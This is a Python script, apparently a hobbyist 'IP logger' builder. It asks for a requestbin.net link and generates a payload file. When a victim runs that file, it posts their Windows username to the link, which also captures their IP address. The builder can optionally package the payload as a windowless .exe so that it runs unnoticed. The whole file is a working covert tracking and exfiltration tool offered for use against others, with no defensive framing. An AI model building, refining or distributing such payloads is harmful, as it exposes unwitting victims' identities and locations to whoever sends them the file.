import requests
import os

# Made By ProtectioN#9514

def buildexe():
    test = "test"
    f = open("iplogger.py", "w+")
    f.write("import os")
    f.write("\n")
    f.write("import requests")
    f.write("\n")
    f.write('r = requests.post("' + link + '", data={"windows username":os.getlogin()})')
    f.close
    os.system('pyinstaller --onefile -w iplogger.py')
    print("File created!")
    print("It is in the 'dist' folder")

def build():
    test = "test"
    f = open("iplogger.py", "w+")
    f.write("import os")
    f.write("\n")
    f.write("import requests")
    f.write("\n")
    f.write('r = requests.post("' + link + '", data={"windows username":os.getlogin()})')
    f.close

def reqinstall():
    os.system("pip3 install requests")
    os.system("pip3 install pyinstaller")
    os.system("cls")


print("Simple IP Logger")
print("Made by ProtectioN#9514")
print("")
print("Do you want to install the requirements for the tool to work? (Y/N)")
print("")
req = input("-> ")
if req == "Y":
    reqinstall()
elif req == "y":
    reqinstall()
elif req == "N":
    print("")
elif req == "n":
    print("")
else:
    print("Invalid Input")
    
print("Please enter your http://requestbin.net/ link")
link = str(input("-> "))
print("Do you wanna compile the file into a .exe or keep it as a .py (.exe/.py)")
choise = input("-> ")

if choise == ".exe":
    buildexe()
elif choise == ".py":
    build()






